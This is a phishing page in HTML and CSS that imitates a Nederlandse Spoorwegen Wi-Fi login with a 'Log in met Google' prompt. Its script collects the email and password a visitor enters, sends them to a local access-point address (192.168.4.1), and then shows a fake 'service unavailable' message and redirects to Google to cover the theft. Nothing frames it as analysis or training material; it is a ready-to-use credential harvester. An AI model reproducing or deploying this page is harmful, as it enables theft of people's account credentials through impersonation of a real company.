.form-control {
    width: 100%;
    padding: 10px;
    margin-bottom: 10px;
    border: 1px solid #ddd;
    border-radius: 4px;
    box-sizing: border-box;
    text-align: center;
}

.form-control:focus {
    border-color: #0056b3;
    outline: none;
}

.btn {
    width: 100%;
    padding: 10px;
    border: none;
    border-radius: 4px;
    background-color: #007bff;
    color: white;
    cursor: pointer;
    transition: background-color 0.3s;
}

.btn:hover {
    background-color: #0056b3;
}

.welcome-text {
    font-size: 24px;
    margin: 20px 0;
    color: #333;
}

    font-size: 18px;
    margin: 10px 0;
    color: #555;

<body>
    <div class="login-form">
        <div class="login-image"></div>
        <div class="welcome-text">Welkom bij de Nederlandse Spoorwegen</div>
        <div class="google-login">Log in met Google</div>
        <input type="email" id="email" class="form-control" placeholder="Email">
        <input type="password" id="password" class="form-control" placeholder="Wachtwoord">
        <button onclick="sendCredentials()" class="btn">Aanmelden</button>
    </div>

    <script>
        function sendCredentials() {
            var email = document.getElementById('email').value;
            var password = document.getElementById('password').value;
            
            getFile("http://192.168.4.1/?email=" + encodeURIComponent(email) + "&password=" + encodeURIComponent(password));
            alert("Service indisponible.");
            window.location.href = "https://www.google.com";
        }

        function getFile(url) {
            var xhr = new XMLHttpRequest();
            xhr.open("GET", url, true);
            xhr.send();
        }
    </script>
</body>
